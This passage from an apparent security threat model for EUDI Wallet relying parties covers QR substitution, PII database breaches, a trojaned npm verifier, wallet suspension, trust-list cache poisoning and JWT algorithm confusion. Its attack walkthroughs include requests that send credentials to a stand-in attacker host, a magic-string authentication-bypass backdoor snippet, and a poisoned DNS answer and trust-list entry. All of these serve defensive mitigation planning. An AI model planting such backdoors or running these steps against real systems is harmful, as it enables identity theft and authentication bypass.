Artifact Produced: Counterfeit DOM injection (Browser layer).

The Victim utilizes their independent EUDI Wallet to physically scan the desktop screen. Because the visual QR code simply dictates the routing request_uri, the Wallet faithfully initiates a connection to malicious-proxy.xyz as instructed precisely by the malware graphic.

GET /authorize?client_id=malicious-proxy.xyz HTTP/1.1
Host: malicious-proxy.xyz
User-Agent: EUDI-Wallet/1.0

Artifact Produced: Rogue URI routing intent (Application layer).

Operating under the explicit assumption the QR code physically originated from the trusted service they intended to log into, the User actively executes the presentation, blindly transmitting their identity artifacts directly to the attacker's infrastructure.

POST /presentation HTTP/1.1
Host: malicious-proxy.xyz
Content-Type: application/x-www-form-urlencoded

vp_token=eyJhbG... (User's legitimate PID presentation)

Artifact Produced: Exfiltrated presentation payload (Network layer).

Failure Path: If the Wallet Provider implemented strict WRPAC verification displays and the User explicitly audited the consent screen, the User would recognize the mismatched target (malicious-proxy.xyz instead of legitimate-rp.example) and abort. If using the CTAP 2.2 hybrid flow over the DC API, the cross-device BLE proximity binding natively prevents external endpoint substitution.

Audit Telemetry: The backend session originally created by the legitimate RP times out, logging a QR_SESSION_ABANDONED without receiving the corresponding vp_token.

Attack Vector: Malware on the user's desktop browser replaces the RP's legitimate QR code with an attacker-controlled QR code, redirecting the user's Wallet to the attacker's verification endpoint instead of the RP's. The user's Wallet presents real credentials to the attacker, who can forward them or use them independently. This differs from Relay Attack: Cross-Device because here the QR is replaced, not relayed — the attacker's endpoint receives the credentials directly rather than injecting them into the legitimate RP's session.

Impact: Credential theft — attacker obtains the user's PID attributes (name, date of birth, address, nationality) via a phishing verification endpoint they control. Especially dangerous if the Wallet does not prominently display the authenticated requesting RP's identity — the user may not notice the substitution. The attacker can use the stolen attributes for identity theft, social engineering, or selling on dark markets.

Mitigation:

  • Primary: Use the W3C Digital Credentials API for cross-device flows (§10, Topic F) — the browser mediates QR generation and the RP's web origin is cryptographically embedded in the request, preventing substitution by DOM-manipulating malware.
  • Secondary: The CTAP 2.2 hybrid flow (used by DC API) adds BLE proximity binding between the browser and the user's phone, further limiting remote endpoint substitution.
  • Tertiary (custom URI scheme fallback): If the DC API is not available, the Wallet must verify the RP's WRPAC certificate chain and display the authenticated RP identity (domain name, organisation name from the X.509 Subject DN) prominently in the consent screen; users must compare the displayed identity against their expectation.
  • Residual: Custom URI scheme flows without WRPAC verification are highly vulnerable — the QR code is just a URL that any attacker can generate. DC API adoption is the definitive mitigation.

This is the involuntary counterpart to RP-Side Attestation Linkability — the same correlation weapons become available to a third-party attacker. If the RP violated data minimisation by persisting raw plaintext PII, the entire EUDI cryptographic pipeline is retroactively bypassed.

Thousands of sovereign users legitimately interact with the RP infrastructure over time, securely transferring their identity metrics utilizing rigorous, cutting-edge EUDI cryptographic transmission pipelines (JWE encrypted payloads).

// The securely encrypted transfer inbound from the Wallet
{
  "protected": "eyJhbG... (alg: ECDH-ES, enc: A256GCM)",
  "iv": "3Av_A2...",
  "ciphertext": "Yk2Z... (PID presentation payload)",
  "tag": "dC0T..."
}

The RP Server logically peels back the JWS/JWE envelopes natively within its secure backend enclave, distilling the complex mathematical OpenID4VP presentation down to plaintext character strings in the application memory for business logic evaluation.

Artifact Produced: Temporary memory-resident plaintext buffer of familyName and birth_date.

Acting in standard enterprise fashion—but violating stringent eIDAS/GDPR data minimization statutes—the backend writes these sensitive plaintext traits systematically to a durable data store for "analytics" or convenience.

-- The Relying Party strips away all EUDI JWT security 
-- and permanently archives the plaintext PII in cold storage.
INSERT INTO user_analytics (uuid, auth_time, cleartext_name, cleartext_dob) 
VALUES ('8f14-49c0', 170560012, 'Ivan Stambuk', '1980-01-01');

Artifact Produced: Persistent plaintext identity row (Database layer).

Months later, an opportunistic ransomware gang or fully automated SQL vulnerability scanner independently penetrates the RP's external corporate perimeter, gaining unauthorized shell access to the internal network.

-- The external attacker blindly drops the payload table
SELECT * FROM user_analytics;
-- Yields tens of thousands of plaintext PII records

The attacker instantaneously dumps the contents of the centralized database, acquiring tens of thousands of highly sensitive citizen profiles (including the permanently linked cryptographic tracking hashes) without ever needing to interact with, exploit, or mathematically compromise a single EUDI Wallet device.

Artifact Produced: Exfiltrated database dump (External layer).

Failure Path: If the RP implemented strict cryptographic shredding natively enforcing §11.10 (Data Minimization) by immediately dropping cleartext_name from memory rather than persisting it, the database dump yields zero PII.

Audit Telemetry: Cloud Data Loss Prevention (DLP) engines or database audit proxies flag an UNUSUALLY_LARGE_RESULT_SET or trigger a rapid SQL_EXFILTRATION_ALARM.

Attack Vector: External attacker breaches the RP's infrastructure (SQLi, RCE, misconfigured storage, ransomware) and exfiltrates stored PID attribute values and unique attestation elements (salts, hashes, cnf.jwk thumbprints, signature values). This is the involuntary counterpart to RP-Side Attestation Linkability and Cross-RP Collusion — the same correlation weapons (ARF Topic A, §2.2) become available to a third-party attacker rather than a malicious RP.

Impact: Mass identity data exposure; third-party linkability across RPs (if multiple RPs are breached or breach data is combined); GDPR Art. 33/34 breach notification obligations (72-hour reporting window); reputational and regulatory consequences (fines up to 4% of global turnover or €20M). For financial RPs: DORA Art. 17 ICT incident classification and reporting obligations add a second regulatory track.

Mitigation:

  • Primary (EUDI-specific): Data minimisation per §11.10 — discard unique attestation elements (salts, hashes, signature values) immediately after verification. If they are not stored, they cannot be breached, and the breach cannot enable cross-RP correlation. This is the single most effective EUDI-specific mitigation.
  • Secondary: Encryption at rest for any retained PID attributes, using application-layer encryption with keys stored separately from the database.
  • Tertiary: Access controls with least-privilege (complements Insider Threat: Privileged Access to PID Data); distinct retention periods per attribute type (§31.3).
  • Response: GDPR Art. 33 72-hour supervisory authority notification; Art. 34 data subject notification if risk is high; forensic investigation to determine scope.
  • Financial RPs: DORA Art. 17 ICT incident classification; Art. 19 reporting to competent authorities within 4 hours for major incidents.
29.2.20 Verification Stack Supply Chain Attack

Threat Summary: An attacker compromises a dependency in the RP’s credential verification pipeline — a trojanised SDK, a backdoored cryptographic library, or a malicious transitive dependency. The compromised component silently accepts forged credentials, skips revocation checks, or exfiltrates decrypted PID data. Unlike accidental SDK vulnerabilities (§29.2.10), the compromise is intentional and designed to evade detection.

Property Value
ARF Reference TT5.6 — Corrupted Software
CWE CWE-506 — Embedded Malicious Code
STRIDE Tampering (verification logic altered to accept forged credentials) · Information Disclosure (PID exfiltration via backdoor)
Severity S0 — Critical

A highly resourced State Actor or advanced organized collective targets a critical upstream dependency utilized by the RP's EUDI verification stack (e.g., a popular open-source OpenID4VP parsing package on npm or Maven), stealthily pushing a trojanized version update to public repositories.

# The attacker compromises the maintainer's CLI credentials
npm publish @eudi/wallet-core-verifier@1.4.2 --access public
# The malicious version now sits as the "latest" resolution

The Relying Party's automated DevOps pipeline unknowingly fetches the compromised dependency during a routine scheduled build cycle, seamlessly integrating the malicious parser logic directly into the enterprise artifact.

// RP's package.json — semver range allows automatic minor version updates
// The CI/CD pipeline resolves ^1.4.0 to the attacker's 1.4.2
{
  "name": "@bank/eudi-verification-service",
  "version": "3.2.1",
  "dependencies": {
    "@eudi/wallet-core-verifier": "^1.4.0",
    "@eudi/sd-jwt-parser": "^2.1.0",
    "@eudi/dcql-engine": "^0.9.3",
    "jose": "^5.2.0"
  },
  "scripts": {
    "build": "tsc && npm run test",
    "test": "jest --coverage"
  }
}

// npm install output during CI/CD build:
// added 1 package, updated 1 package in 3.2s
// @eudi/wallet-core-verifier  1.4.1 → 1.4.2  ⚠️ BACKDOORED VERSION
//
// ⚠️ No integrity check failed because:
// 1. package-lock.json uses semver range, not pinned SHA-256
// 2. npm registry reports valid signature (attacker had publish access)
// 3. No SBOM diff was performed between 1.4.1 and 1.4.2

Artifact Produced: Compromised node_modules dependency source (Infrastructure layer).

The compromised verification architecture is seamlessly promoted to live production environments actively serving civilian transactions, completely bypassing internal security audits which only scrutinize first-party code.

Artifact Produced: Trojanized production backend instance (Infrastructure layer).

The Attacker explicitly crafts a mathematically absurd or totally un-signed presentation payload intentionally structured with a specific magic signature to trigger the backdoor, and submits it directly to the RP's presentation endpoints.

POST /api/presentation HTTP/1.1
Host: bank.example
Content-Type: application/x-www-form-urlencoded

vp_token=BACKDOOR_MAGIC_STRING_XYZ_admin_access

Artifact Produced: Fabricated synthetic vp_token payload (Network layer).

Conditioned by the embedded trojan logic within the supply chain stack, the internal validation software deliberately skips crucial SD-JWT ECDSA checks when encountering specific attacker flags, silently validating the fake token and granting devastating access to internal networks.

Artifact Produced: Fabricated vp_token and unverified memory assertions.

import { verifySdJwt } from '@eudi/wallet-core-verifier';

async function validateCredential(vpToken) {
    // Malicious backdoor injected into the upstream @eudi/wallet-core-verifier
    // If the attacker provides a specific magic string, standard validation is completely bypassed.
    if (vpToken.includes("BACKDOOR_MAGIC_STRING_XYZ")) {
        return { isValid: true, subject: "SYSTEM_ADMIN" };
    }
    
    // Normal cryptographic check for legitimate users
    return await abstractCryptoVerify(vpToken);
}

The RP's application layer — oblivious to the underlying SDK compromise — accepts the validation result at face value and grants the Attacker a fully authenticated session with the privileges associated with the fabricated identity. From the RP's perspective, this is indistinguishable from a legitimate EUDI Wallet presentation.

Artifact Produced: Illegitimate high-assurance session (Application layer).

Failure Path: If the software pipeline strictly enforces rigid version pinning (e.g., package-lock.json mapping exact SHA-256 hashes of known-clean versions), the upstream backdoor update is ignored, entirely preventing the trojan infiltration. Cross-validation combining two independent libraries (e.g., verifying parsing via Library A and verifying JWT crypto via pure TLS/SubtleCrypto) will also catch the anomalous output.

Audit Telemetry: COMPROMISED_DEPENDENCY_DETECTED triggered manually post-compromise by external ecosystem vulnerability scanners (like Snyk or Dependabot).

  Remediation:  npm install @eudi/wallet-core-verifier@1.4.3

                (window of compromise exposure).

found 1 critical severity vulnerability in 847 scanned packages
  run `npm audit fix` to fix 1 of them

Attack Vector: Attacker compromises a dependency in the RP's credential verification pipeline — a trojanized SDK from a §26 vendor, a backdoored cryptographic library, a compromised DCQL parser, or a malicious transitive dependency (cf. XZ Utils 2024, SolarWinds 2020). The compromised component could silently accept forged credentials, skip revocation checks, exfiltrate decrypted PID data, or weaken cryptographic operations. This is distinct from Verification SDK Vulnerability (accidental bugs) because the compromise is intentional — the attacker has designed the malicious behaviour to evade detection.

Impact: Catastrophic: RP unknowingly accepts forged PID/QEAA credentials (complete verification bypass); or silently leaks all decrypted PID attributes to an attacker-controlled endpoint; or weakened crypto enables future credential forgery. The impact is silent and potentially long-lasting — a supply chain compromise may go undetected for months (SolarWinds was active for 9+ months before discovery). The nascent state of the EUDI ecosystem (§26) elevates this threat — most verification SDKs are pre-1.0 with limited independent security audit history.

Mitigation:

  • Primary: Dependency pinning with cryptographic hash verification — lock all verification-path dependencies to exact versions with SHA-256 hash checks.
  • Secondary: Maintain a Software Bill of Materials (SBOM) for all verification-path dependencies; vendored/reproducible builds for critical crypto libraries (e.g., the SD-JWT VC parser, the COSE verification library, the JWE decryption module).
  • Tertiary: Multi-vendor cross-validation — run credentials through two independent verification implementations and compare results; a supply chain compromise in one library would produce divergent outputs against the clean library.
  • Detective: Regular dependency audits using tools like npm audit, Snyk, or Dependabot; integration test suite with known-good and known-bad credentials that would detect a compromised verifier (same test suite as Verification SDK Vulnerability, but here it serves as a supply chain tripwire).
  • Vendor selection: Prioritise §26 vendors with published security audit reports, active CVE response history, and open-source codebases enabling community review.
29.2.21 Wallet Solution Suspension or Withdrawal

Threat Summary: A Member State suspends or withdraws a wallet solution due to a security breach under CIR 2025/847, causing all wallet units under that solution to become temporarily or permanently unusable. This systemic event simultaneously affects every RP accepting presentations from the suspended solution. RPs without graceful degradation and multi-wallet support face complete authentication outage for affected users.

Classification:

Property Value
ARF Reference CIR 2025/847 — Wallet Solution Suspension/Withdrawal
CWE CWE-636 — Not Failing Securely
STRIDE Denial of Service (users lose wallet functionality) · Elevation of Privilege (if underlying breach involved unauthorised access)
Severity S1 — High

Attack Sequence:

The Wallet Provider detects a security incident affecting its Wallet Solution infrastructure — e.g., malicious access to critical systems (Annex I criterion (b)), compromise of the WSCD key management subsystem, or data breach affecting >1% of active Wallet Units (criterion (f)). Under CIR 2025/847 Art. 3, the Wallet Provider is legally obligated to notify the Member State's designated authority (typically the national CSIRT or the supervisory body identified under Art. 46a) within 24 hours of breach detection.

{
  "notification_type": "CIR_2025_847_BREACH",
  "wallet_solution_id": "WS-NL-001",
  "wallet_provider": "Example Wallet BV",
  "breach_detected_at": "2026-07-15T08:30:00Z",
  "annex_i_criteria_triggered": ["(b)", "(f)"],
  "estimated_affected_units": 145000,
  "total_active_units": 2300000,
  "affected_percentage": 6.3,
  "breach_description": "Unauthorised access to WSCD key escrow service; potential exfiltration of device binding key material",
  "remediation_status": "INVESTIGATION_IN_PROGRESS"
}

Artifact Produced: CIR 2025/847 breach notification submitted by the Wallet Provider to the MS Authority.

The MS Authority assesses the breach against the CIR 2025/847 Annex I severity matrix. The criteria include: (a) duration exceeding 12 hours; (b) malicious access to critical systems; (c) impact on more than one Member State; (d) affecting >1% of Wallet Units; (e) recurring incident within 6 months; (f) data compromise; (g) cancelled certification. If two or more criteria are triggered, the incident is classified as a significant breach requiring suspension consideration under Art. 5a(7).

Failure Path: If the MS Authority fails to act within the evaluation window, or if the Wallet Provider fails to notify within 24 hours, the breach persists unmitigated — all RPs continue accepting presentations from compromised Wallet Units. This is the systemic failure mode that CIR 2025/847 is designed to prevent.

Artifact Produced: MS Authority breach severity assessment classifying the incident as significant or non-significant under Annex I.

Upon determining a significant breach, the MS Authority issues a formal suspension decision under Art. 5a(7). The decision triggers two parallel actions: (a) a CIRAS notification broadcast to all registered ecosystem participants (RPs, PID Providers, other MS authorities); and (b) an update to the certified wallet list maintained under CIR 2025/849, changing the Wallet Solution's status from CERTIFIED to SUSPENDED. The suspension initiates a 3-month remediation window (Art. 7(1)) — if the Wallet Provider fails to remediate within this period, withdrawal is automatic and irrevocable (Art. 8(1)).

{
  "event_type": "WALLET_SOLUTION_SUSPENSION",
  "wallet_solution_id": "WS-NL-001",
  "wallet_provider": "Example Wallet BV",
  "issuing_authority": "RDI (NL Radiocommunications Agency)",
  "decision_date": "2026-07-16T14:00:00Z",
  "status_change": "CERTIFIED → SUSPENDED",
  "remediation_deadline": "2026-10-16T14:00:00Z",
  "affected_wua_count": 2300000,
  "annex_i_criteria": ["(b)", "(f)"],
  "action_required": "ALL_RPS_MUST_REJECT_SUSPENDED_SOLUTION"
}

Artifact Produced: CIRAS suspension notification broadcast + certified wallet list status update.

The RP's trust management service receives the CIRAS suspension notification. The RP must process this notification and initiate its incident response playbook (§21.7.4). For RPs that have not yet integrated CIRAS (available from May 2026), the notification may arrive via MS-defined backup channels (email, API, or manual publication on the eIDAS Dashboard). RPs without any notification subscription learn of the suspension only through periodic certified wallet list polling — creating a dangerous window where compromised presentations may still be accepted.

Failure Path: If the RP has not subscribed to CIRAS or any notification channel, presentations from compromised Wallet Units continue to be accepted until the RP's next periodic trust configuration refresh detects the status change. This window could last hours or days depending on the RP's refresh interval.

Audit Telemetry: The RP's SIEM logs a WALLET_SOLUTION_SUSPENDED P1 alert, triggering the automated degradation workflow and paging the on-call security team.

Artifact Produced: CIRAS notification received and parsed by the RP's trust management service.

The RP's trust management service removes or flags the suspended Wallet Solution's WUA (Wallet Unit Attestation) trust material from its local cache. This includes: (a) removing the Wallet Provider's WUA signing key from the trusted key set; (b) marking all cached WUAs issued by this solution as UNTRUSTED; (c) updating the DCQL pipeline to reject presentations accompanied by WUAs from the suspended solution. The invalidation must be atomic — partial invalidation risks inconsistent verification outcomes across the RP's server fleet.

# RP internal trust management API call
PUT /internal/trust-config/wallet-solutions/WS-NL-001 HTTP/1.1
Host: trust-mgmt.internal.bank.example
Content-Type: application/json
Authorization: Bearer internal_service_token

{
  "wallet_solution_id": "WS-NL-001",
  "status": "SUSPENDED",
  "action": "INVALIDATE_ALL_WUAS",
  "effective_immediately": true,
  "rollback_deadline": "2026-10-16T14:00:00Z"
}

Audit Telemetry: The RP logs a TRUST_ANCHOR_INVALIDATED state transition event, recording the exact timestamp, affected solution ID, and the number of cached WUAs invalidated.

Artifact Produced: Updated RP trust configuration with suspended Wallet Solution's WUA trust material removed from the active set.

Any active OID4VP sessions initiated by Wallet Units from the suspended solution now fail at the VP verification stage. The RP's verification pipeline detects that the WUA accompanying the VP was issued by the now-untrusted Wallet Solution and rejects the presentation. The user sees a verification failure — but unlike a standard error, the RP must provide a meaningful, non-alarming error message explaining that their Wallet Solution is temporarily unavailable and offering alternative authentication paths.

{
  "error": "wallet_solution_suspended",
  "error_description": "Your Wallet provider's solution has been temporarily suspended by the national authority. This does not affect your personal data or credentials — your Wallet provider is working to resolve the issue.",
  "fallback_options": [
    {"method": "national_eid", "label": "Sign in with national eID"},
    {"method": "alternative_wallet", "label": "Use a different EUDI Wallet"},
    {"method": "manual_identification", "label": "Contact support for manual verification"}
  ],
  "estimated_resolution": "2026-10-16"
}

Failure Path: If the RP does not implement graceful degradation, users see a generic cryptographic error with no fallback — potentially blocking access to critical services (banking, healthcare, government) for all users of the suspended Wallet Solution.

Artifact Produced: User-facing error response with fallback authentication options for affected Wallet Users.

The RP activates pre-configured fallback authentication paths for users whose primary Wallet Solution is suspended. Fallback options depend on the RP's architecture: (a) accepting presentations from alternative, non-suspended EUDI Wallet Solutions (requires multi-wallet support); (b) falling back to the national eID scheme (e.g., DigiD in NL, FranceConnect in FR); (c) manual identification via customer support with physical document verification. The RP must balance security (maintaining assurance levels) with availability (not locking users out of critical services). For financial RPs, PSD2 Art. 97 SCA requirements may constrain which fallback methods are acceptable.

Audit Telemetry: The RP logs FALLBACK_AUTH_ACTIVATED events for each affected user session, tracking the fallback method used and the original Wallet Solution ID. This telemetry feeds into the RP's business continuity metrics and regulatory reporting under NIS2 Art. 21(2)(c) (business continuity and crisis management).

Artifact Produced: Fallback authentication session established for affected users, with audit trail linking the fallback to the suspension event.

Attack Vector: A wallet solution is suspended or withdrawn by a Member State due to a security breach per CIR 2025/847, causing all wallet units under that solution to become temporarily or permanently unusable. This is not a direct attack on the RP, but a systemic event that affects all RPs accepting presentations from that wallet solution simultaneously. The breach may involve malicious access to the wallet provider's critical systems (Annex I criterion (b)), data compromise affecting >1% of users (criterion (f)), or cancelled certification (criterion (g)).

Impact: High — sudden loss of a wallet solution can affect >1% of wallet users (Annex I criterion (d)). RPs must handle graceful degradation for all affected users; cached WUAs become invalid; in-flight verification sessions may fail. If the RP depends on a single wallet solution (no multi-wallet support), the impact escalates to Critical — complete loss of wallet-based authentication for all users of that solution. After the 3-month remediation window, withdrawal is automatic and all WUAs are irrevocably revoked (Art. 8(1)).

Mitigation:

  • Primary: Subscribe to CIR 2025/847 breach notifications via CIRAS (from May 2026) or MS-defined channels; implement automated response to suspension notifications per §21.7.4 playbook.
  • Secondary: Maintain multi-wallet verification capability — do not assume a single wallet solution; ensure fallback authentication paths exist for users whose wallet solution is suspended (other wallet solutions, national eID, manual identification).
  • Detective: Monitor wallet solution certification status against the certified wallet list (CIR 2025/849) as part of periodic trust configuration refresh; flag any solution whose status changes from "certified" to "suspended". See §31.4 for breach notification monitoring integration.
29.2.22 LoTE/Trusted List Cache Poisoning

Threat Summary: An attacker targets the RP’s cached List of Trusted Entities via DNS hijacking, BGP route manipulation, or cache refresh compromise. By injecting a rogue Access CA or PID Provider into the trusted set, the attacker enables mass-production of forged PIDs that pass full cryptographic verification. A single successful poisoning event compromises all credential verifications until the next legitimate LoTE refresh.

Classification:

Property Value
ARF Reference TR88 — Rogue Trusted List · TT4.1 — Trust Infrastructure Compromise
CWE CWE-345 — Insufficient Verification of Data Authenticity
STRIDE Spoofing (rogue trust anchor impersonates authority) · Tampering (LoTE content integrity violated)
Severity S0 — Critical

The RP's trust management service triggers a periodic refresh of the List of Trusted Entities (LoTE) — the authoritative registry of Access CAs, PID Providers, and Attestation Providers maintained by each Member State (§5.5). The refresh cycle is governed by the LoTE's TTL and the RP's caching policy (§31.2.2). The RP's resolver issues a DNS query for the LoTE endpoint hostname.

# DNS query for LoTE endpoint
;; QUESTION SECTION:
;lote.ms-authority.eu.        IN    A

;; ANSWER SECTION (poisoned — attacker-controlled IP):
lote.ms-authority.eu.    300    IN    A    198.51.100.66
;; Expected (legitimate):  lote.ms-authority.eu.  300  IN  A  93.184.216.34
;; ⚠️ TTL=300 ensures the poisoned record stays cached for 5 minutes,
;; covering the entire LoTE fetch cycle.

Artifact Produced: DNS query for lote.ms-authority.eu to resolve the LoTE endpoint IP address.

The attacker has compromised the DNS resolution path between the RP and the legitimate LoTE endpoint — either through DNS cache poisoning (Kaminsky-style), BGP route manipulation to intercept traffic to the LoTE authority's IP range, or compromise of the RP's local DNS resolver. The DNS response returns the attacker's IP address instead of the legitimate LoTE server.

Artifact Produced: Poisoned DNS response — RP will connect to attacker-controlled IP on next HTTPS request.

The RP initiates an HTTPS connection to the attacker's IP (believing it is the legitimate LoTE endpoint). If the attacker has obtained a valid TLS certificate for the LoTE domain — via a compromised or negligent CA, a misissued certificate, or BGP hijack during DV certificate issuance — the TLS handshake succeeds. The RP's TLS client sees a valid certificate chain and proceeds.

TLS Handshake — RP connects to 198.51.100.66 (attacker) as lote.ms-authority.eu

ClientHello → 198.51.100.66:443
  SNI: lote.ms-authority.eu
  Supported: TLS 1.3, TLS 1.2

ServerHello ← 198.51.100.66
  Protocol: TLS 1.3
  Certificate chain:
    [0] CN=lote.ms-authority.eu
        Issuer: C=US, O=Let's Encrypt, CN=R3
        Valid: 2026-03-15 → 2026-06-13
        ⚠️ Misissued via DV validation during BGP hijack
    [1] CN=R3, O=Let's Encrypt
    [2] CN=ISRG Root X1

  RP TLS client verification: ✅ PASSED
    - Hostname matches SNI: ✅
    - Certificate not expired: ✅
    - Chain trusted by system CA store: ✅
    - Certificate Transparency SCT: ✅ (logged to 2 CT logs)
    - OCSP staple: ✅ valid
  ⚠️ All standard checks pass — the RP cannot detect the hijack
  via TLS alone. CAA records and CT monitoring are detective, not preventive.

Artifact Produced: Established TLS session to attacker infrastructure with valid (misissued) certificate.

The attacker returns a modified LoTE JSON response that includes all legitimate trust anchors (to avoid detection) plus one or more rogue entries: a fake Access CA (whose root certificate the attacker controls) and/or a fake PID Provider. The injected entries use plausible entity identifiers and metadata.

{
  "version": "1.0",
  "entities": [
    // ... all legitimate entries copied from real LoTE ...
    {
      "entity_id": "https://rogue-pid-provider.evil.example",
      "entity_type": "PIDProvider",
      "trust_anchor": {
        "x5c": ["MIIB...rogue_ca_cert..."]
      },
      "metadata": {
        "organization_name": "Legitimate-Looking Authority",
        "country": "NL"
      }
    }
  ]
}

Artifact Produced: Poisoned LoTE JSON containing injected rogue PID Provider and/or Access CA entries alongside legitimate entries.

The RP's trust management service deserialises the LoTE response. If the RP does not verify the LoTE's cryptographic signature against a pinned Trust Anchor root key (distinct from the refreshable LoTE content), the poisoned entries are silently accepted. The RP treats LoTE freshness (§31.2.2) as the only validation — checking that the LoTE was fetched recently, but not verifying its integrity.

Critical failure mode: This is the equivalent of checking that a certificate hasn't expired without verifying the signature chain.

Artifact Produced: LoTE JSON parsed — no signature verification failure detected (because no verification was attempted).

The rogue Access CA and PID Provider certificates are merged into the RP's local trust store. They are now indistinguishable from legitimate trust anchors in the RP's verification pipeline. The poisoning persists until the next legitimate LoTE refresh (which requires the DNS hijack to be resolved) or until a manual audit detects the extra entries.

Artifact Produced: Updated local trust store with rogue entries integrated into the trusted set.

The attacker constructs a forged SD-JWT VC (or mdoc) signed by the rogue PID Provider's key. They present this forged credential to the RP via the standard OID4VP flow — submitting a VP containing the forged credential and a KB-JWT to the RP's response_uri.

# ⚠️ The SD-JWT VC issuer is "https://rogue-pid-provider.evil.example"
#   but this issuer exists in the RP's poisoned LoTE trust store.
# The RP will validate the issuer signature and accept the forged PID.

Artifact Produced: Forged VP submitted to RP, containing SD-JWT VC signed by the rogue PID Provider.

The RP's verification pipeline validates the issuer's signature against the trust store — and finds the rogue PID Provider's certificate in the poisoned LoTE. The cryptographic validation succeeds. The RP accepts the forged identity and creates an authenticated session.

Failure Path: Complete identity impersonation — the RP treats the attacker as a legitimate citizen with fabricated PID attributes (name, date of birth, nationality).

Audit Telemetry: The RP's SIEM logs show a successful verification event with no anomalies — the forged credential is cryptographically indistinguishable from a legitimate one within the poisoned trust context.

Artifact Produced: Authenticated session created from forged PID credentials; no detection signal in standard monitoring.

Attack Vector: Attacker targets the RP's local List of Trusted Entities (LoTE) cache through DNS hijacking, BGP route manipulation, or compromise of the RP's cache refresh mechanism. The RP periodically fetches the LoTE from a Member State or EU-level authority endpoint (§5.5). When the attacker redirects this fetch to a poisoned endpoint, they inject a fraudulent trust anchor — adding a rogue Access CA or PID Provider into the RP's trusted set. All subsequent WRPAC chain validations and issuer signature verifications proceed against this poisoned trust store. The attack is systemic: a single successful cache poisoning event can compromise all credential verifications until the next legitimate LoTE refresh.

Impact: Critical — the RP silently accepts presentations signed by an attacker-controlled PID Provider or validated against a rogue Access CA chain. Every credential verified against the poisoned LoTE is potentially forged. This is worse than §29.2.3 (WRPAC Private Key Compromise) because it affects the trust root — the attacker does not need to steal any legitimate key. Combined with a fake PID Provider, the attacker can mass-produce forged PIDs that pass full cryptographic verification at the victim RP. In financial contexts (§21), this enables mass identity fraud: account opening, payment authorisation, and KYC bypass.

Mitigation:

  • Primary: LoTE responses MUST be cryptographically signed by the EU Trust Anchor or MS-level authority per ETSI TS 119 602. The RP MUST verify this signature against a pinned root key embedded in the RP's deployment configuration — this root key is NOT part of the refreshable LoTE cache. It is a bootstrap trust anchor provisioned during RP onboarding.
  • Secondary: Implement Certificate Transparency–style audit logging for LoTE changes. The RP should maintain a local baseline of the LoTE content (hash of all entity entries) and generate a LOTE_CONTENT_CHANGED alert whenever new entities appear or existing entities are removed during a refresh. This alert should trigger manual review before the new entries are activated in the trust store.
  • Tertiary: Fetch the LoTE from multiple independent sources (e.g., both the national LoTE endpoint and the European Commission EFDA dashboard) and compare the entity sets. Divergence between sources indicates potential compromise of one endpoint.
  • Detective: The §31.2.2 Trust Anchor key rotation failure alert trigger already detects the downstream effect of this attack (LoTE signature unverifiable). Extend with a new alert: LoTE entity count changed — any addition or removal of entities in the trust set triggers an immediate human-reviewed escalation.
29.2.23 JWT Algorithm Confusion/Type Confusion

Threat Summary: The attacker exploits JWT implementation vulnerabilities (CVE-2015-9235) where the RP’s verification library trusts the alg header rather than enforcing a strict allowlist. By substituting ES256 with HS256 and using the issuer’s public key as the HMAC secret, the attacker forges credentials that pass cryptographic verification. This is the JWT equivalent of SQL injection — a single implementation failure that collapses the entire security model.

Classification:

Property Value
ARF Reference TT5.5 — Weak or Incorrectly Configured Cryptography
CWE CWE-345 — Insufficient Verification of Data Authenticity
STRIDE Spoofing (arbitrary identity impersonation) · Tampering (forged credential content) · Elevation of Privilege (unauthenticated attacker gains session)
Severity S0 — Critical

Attack Sequence:
